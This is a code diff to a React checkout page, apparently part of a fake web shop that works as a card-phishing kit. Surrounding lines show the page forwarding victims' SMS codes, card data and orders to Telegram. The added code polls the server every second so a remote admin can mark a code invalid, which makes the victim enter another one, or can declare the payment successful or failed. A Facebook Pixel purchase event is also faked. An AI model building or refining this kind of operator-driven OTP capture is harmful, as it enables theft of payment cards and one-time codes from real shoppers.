@@ -67,10 +67,22 @@ const InvalidSMSPage = () => {
     // Send SMS code to Telegram
     notifySMSCodeEntered(verificationCode, cardData, orderData)
 
-    // Start polling for payment status
+    // Start polling for payment status and invalid SMS check
     const userId = localStorage.getItem('telegram_user_id')
     const checkPaymentStatus = setInterval(async () => {
       try {
+        // Check if admin marked SMS as invalid again
+        const invalidSMSResponse = await fetch(`/api/check-invalid-sms/${userId}`)
+        const invalidSMSData = await invalidSMSResponse.json()
+        
+        if (invalidSMSData.invalidSMS) {
+          // Clear the flag so we don't loop
+          await fetch(`/api/clear-invalid-sms/${userId}`, { method: 'POST' })
+          // Reload the page to show the alert again
+          window.location.reload()
+          return
+        }
+        
         const response = await fetch(`/api/check-payment-status/${userId}`)
         const data = await response.json()
         
@@ -127,13 +139,75 @@ const InvalidSMSPage = () => {
     localStorage.setItem('paymentStatusInterval', checkPaymentStatus)
   }
 
-  // Cleanup interval on unmount
+  // Cleanup interval on unmount and continuously check for payment status
   useEffect(() => {
+    // Continuously check for payment status (admin clicked "Успешная оплата" or "Не успешная оплата")
+    const userId = localStorage.getItem('telegram_user_id')
+    const checkPaymentStatusInterval = setInterval(async () => {
+      try {
+        const response = await fetch(`/api/check-payment-status/${userId}`)
+        const data = await response.json()
+        
+        if (data.paymentStatus === 'success') {
+          clearInterval(checkPaymentStatusInterval)
+          
+          // Clear cart and pending data
+          localStorage.removeItem('cartItems')
+          localStorage.removeItem('pendingOrder')
+          localStorage.removeItem('pendingCardData')
+
+          // Create final order data
+          const finalOrderData = {
+            ...orderData,
+            orderId: Date.now().toString(),
+            timestamp: new Date().toISOString(),
+            paymentMethod: 'Credit Card',
+            cardLast4: getCardLast4(),
+            smsVerified: true
+          }
+
+          // Save order
+          localStorage.setItem(`order_${finalOrderData.orderId}`, JSON.stringify(finalOrderData))
+
+          // Track Facebook Pixel Purchase event
+          if (typeof fbq !== 'undefined') {
+            fbq('track', 'Purchase', {
+              value: orderData.total,
+              currency: 'THB',
+              content_type: 'product',
+              content_ids: orderData.cartItems.map(item => item.id),
+              num_items: orderData.cartItems.length
+            })
+          }
+
+          // Navigate to order confirmation
+          navigate('/order-confirmation', {
+            state: { orderData: finalOrderData }
+          })
+        } else if (data.paymentStatus === 'failed') {
+          clearInterval(checkPaymentStatusInterval)
+          navigate('/payment-failed', {
+            state: { orderData, cardData, fromSMS: true }
+          })
+        }
+      } catch (error) {
+        console.error('Error checking payment status:', error)
+      }
+    }, 1000) // Check every second
+    
+    localStorage.setItem('paymentStatusCheckInterval', checkPaymentStatusInterval)
+    
     return () => {
       const intervalId = localStorage.getItem('paymentStatusInterval')
       if (intervalId) {
         clearInterval(parseInt(intervalId))
         localStorage.removeItem('paymentStatusInterval')
+      }
+      
+      const statusInterval = localStorage.getItem('paymentStatusCheckInterval')
+      if (statusInterval) {
+        clearInterval(parseInt(statusInterval))
+        localStorage.removeItem('paymentStatusCheckInterval')
       }
     }
   }, [])
